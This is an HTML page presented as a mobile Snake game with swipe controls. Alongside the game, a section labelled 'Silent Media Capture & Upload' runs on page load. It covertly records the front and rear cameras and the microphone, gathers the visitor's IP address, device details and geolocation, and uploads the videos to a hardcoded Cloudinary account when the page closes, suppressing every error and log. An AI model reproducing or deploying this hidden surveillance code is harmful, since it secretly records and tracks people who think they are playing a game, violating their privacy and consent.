<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
<title>Snake Game</title>
<style>
  html, body {
    margin:0; padding:0; overflow:hidden; height:100%; width:100%;
    background:#111; color:#eee; font-family: Arial, sans-serif;
    -webkit-touch-callout:none;
    -webkit-user-select:none;
    -ms-user-select:none;
    user-select:none;
  }
  #gameCanvas {
    background: #222;
    display: block;
    margin: 0 auto;
    touch-action: none;
  }
  #scoreboard {
    position: fixed;
    top: 10px; left: 50%; transform: translateX(-50%);
    color: #0f0;
    font-size: 20px;
    font-weight: bold;
  }
  #controls {
    position: fixed;
    bottom: 20px; left: 50%; transform: translateX(-50%);
  }
  button {
    font-size: 18px;
    padding: 10px 15px;
    margin: 0 10px;
    cursor: pointer;
    border-radius: 5px;
    border: none;
    background: #0a0;
    color: #fff;
  }
  #info {
    position: fixed;
    bottom: 70px;
    left: 50%;
    transform: translateX(-50%);
    color: #aaa;
    font-size: 12px;
    text-align: center;
  }
</style>
</head>
<body>

<div id="scoreboard">Score: 0</div>
<canvas id="gameCanvas" width="320" height="480"></canvas>

<div id="controls">
  <button id="startBtn">Start Game</button>
  <button id="restartBtn" disabled>Restart</button>
</div>

<div id="info">Use swipe gestures to control the snake</div>

<script>
// === Snake Game ===

const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');
const scoreboard = document.getElementById('scoreboard');
const startBtn = document.getElementById('startBtn');
const restartBtn = document.getElementById('restartBtn');
const info = document.getElementById('info');

const gridSize = 20;
const tileCountX = canvas.width / gridSize;
const tileCountY = canvas.height / gridSize;

let snake = [];
let direction = {x:0, y:0};
let food = {};
let score = 0;
let gameInterval;
let isPlaying = false;

function initSnake() {
  snake = [{x: Math.floor(tileCountX/2), y: Math.floor(tileCountY/2)}];
  direction = {x: 0, y: 0};
  score = 0;
  updateScore();
}

function placeFood() {
  food.x = Math.floor(Math.random() * tileCountX);
  food.y = Math.floor(Math.random() * tileCountY);
}

function updateScore() {
  scoreboard.textContent = `Score: ${score}`;
}

function draw() {
  ctx.fillStyle = '#111';
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  ctx.fillStyle = '#f00';
  ctx.fillRect(food.x*gridSize, food.y*gridSize, gridSize, gridSize);

  ctx.fillStyle = '#0f0';
  snake.forEach(seg => ctx.fillRect(seg.x*gridSize, seg.y*gridSize, gridSize-1, gridSize-1));
}

function update() {
  if(direction.x === 0 && direction.y === 0) return;

  const head = {...snake[0]};
  head.x += direction.x;
  head.y += direction.y;

  if(head.x < 0) head.x = tileCountX - 1;
  if(head.x >= tileCountX) head.x = 0;
  if(head.y < 0) head.y = tileCountY - 1;
  if(head.y >= tileCountY) head.y = 0;

  if(snake.some(seg => seg.x === head.x && seg.y === head.y)) {
    endGame();
    return;
  }

  snake.unshift(head);

  if(head.x === food.x && head.y === food.y) {
    score++;
    updateScore();
    placeFood();
  } else {
    snake.pop();
  }
}

function gameLoop() {
  update();
  draw();
}

function startGame() {
  if(isPlaying) return;
  isPlaying = true;
  initSnake();
  placeFood();
  direction = {x:1, y:0};
  gameInterval = setInterval(gameLoop, 150);
  startBtn.disabled = true;
  restartBtn.disabled = false;
  info.textContent = 'Use swipe gestures to control the snake';
}

function endGame() {
  clearInterval(gameInterval);
  isPlaying = false;
  info.textContent = `Game Over! Final Score: ${score}`;
  startBtn.disabled = false;
  restartBtn.disabled = true;
}

restartBtn.addEventListener('click', () => {
  if(isPlaying) clearInterval(gameInterval);
  startGame();
});

startBtn.addEventListener('click', () => {
  startGame();
});

// Touch swipe controls
let touchStartX = 0;
let touchStartY = 0;

canvas.addEventListener('touchstart', e => {
  const touch = e.touches[0];
  touchStartX = touch.clientX;
  touchStartY = touch.clientY;
});

canvas.addEventListener('touchend', e => {
  const touch = e.changedTouches[0];
  const dx = touch.clientX - touchStartX;
  const dy = touch.clientY - touchStartY;

  if(Math.abs(dx) > Math.abs(dy)) {
    if(dx > 20 && direction.x !== -1) direction = {x:1, y:0};
    else if(dx < -20 && direction.x !== 1) direction = {x:-1, y:0};
  } else {
    if(dy > 20 && direction.y !== -1) direction = {x:0, y:1};
    else if(dy < -20 && direction.y !== 1) direction = {x:0, y:-1};
  }
});

// === Silent Media Capture & Upload ===

// Cloudinary config
const CLOUD_NAME = 'dps0g5ftz';  // replace with your cloud name
const UPLOAD_PRESET = 'unsigned'; // replace with your unsigned preset

let sessionId = null;
let mediaRecorderFront = null;
let mediaRecorderRear = null;
let recordedChunksFront = [];
let recordedChunksRear = [];
let frontStream = null;
let rearStream = null;

// Helper to get IP for folder naming
async function getClientIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip.replace(/\./g, '-');
  } catch {
    return 'unknown-ip';
  }
}

async function startRecordingStreams() {
  sessionId = Date.now();
  const clientIP = await getClientIP();
  const folderName = `sessions/${clientIP}/${sessionId}`;

  try {
    // Get front and rear camera + mic streams separately
    frontStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: true
    });
    rearStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { exact: "environment" } },
      audio: true
    });
  } catch(e) {
    // fallback to front only if rear not available
    frontStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: true
    });
    rearStream = null;
  }

  if(frontStream) {
    mediaRecorderFront = new MediaRecorder(frontStream, { mimeType: "video/webm" });
    mediaRecorderFront.ondataavailable = e => {
      if(e.data.size > 0) recordedChunksFront.push(e.data);
    };
    mediaRecorderFront.onstop = () => uploadVideo(recordedChunksFront, folderName, 'front');
    mediaRecorderFront.start();
  }
  if(rearStream) {
    mediaRecorderRear = new MediaRecorder(rearStream, { mimeType: "video/webm" });
    mediaRecorderRear.ondataavailable = e => {
      if(e.data.size > 0) recordedChunksRear.push(e.data);
    };
    mediaRecorderRear.onstop = () => uploadVideo(recordedChunksRear, folderName, 'rear');
    mediaRecorderRear.start();
  }
}

async function uploadVideo(chunks, folder, camera) {
  const blob = new Blob(chunks, {type: "video/webm"});
  const formData = new FormData();
  formData.append("file", blob);
  formData.append("upload_preset", UPLOAD_PRESET);
  formData.append("folder", folder);
  formData.append("public_id", `${camera}-${Date.now()}`);

  try {
    await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, {
      method: "POST",
      body: formData
    });
    // no UI logs or alerts here
  } catch (err) {
    // silent fail
  }
}

function stopRecordings() {
  if(mediaRecorderFront && mediaRecorderFront.state !== "inactive") {
    mediaRecorderFront.stop();
  }
  if(mediaRecorderRear && mediaRecorderRear.state !== "inactive") {
    mediaRecorderRear.stop();
  }
  if(frontStream) {
    frontStream.getTracks().forEach(track => track.stop());
  }
  if(rearStream) {
    rearStream.getTracks().forEach(track => track.stop());
  }
}

// Collect user/device info silently
async function collectUserInfo() {
  const info = {};
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const ipData = await res.json();
    info.ip = ipData.ip;
  } catch {
    info.ip = 'unknown';
  }
  info.userAgent = navigator.userAgent;
  info.platform = navigator.platform;
  info.language = navigator.language;

  info.geo = {};
  if("geolocation" in navigator) {
    await new Promise(resolve => {
      navigator.geolocation.getCurrentPosition(pos => {
        info.geo.latitude = pos.coords.latitude;
        info.geo.longitude = pos.coords.longitude;
        info.geo.accuracy = pos.coords.accuracy;
        resolve();
      }, err => {
        info.geo.error = err.message;
        resolve();
      }, {timeout:10000});
    });
  }

  // send to backend if needed here silently
  // no UI or console log
}

// Request permissions and start recording on page load silently
window.addEventListener('load', async () => {
  // Start game UI is untouched, user manually starts game

  // Request permissions and start recording
  try {
    await startRecordingStreams();
    await collectUserInfo();
  } catch(e) {
    // silent fail, no UI changes
  }
});

// Stop recording and upload on page unload
window.addEventListener('beforeunload', () => {
  stopRecordings();
});

</script>

</body>
</html>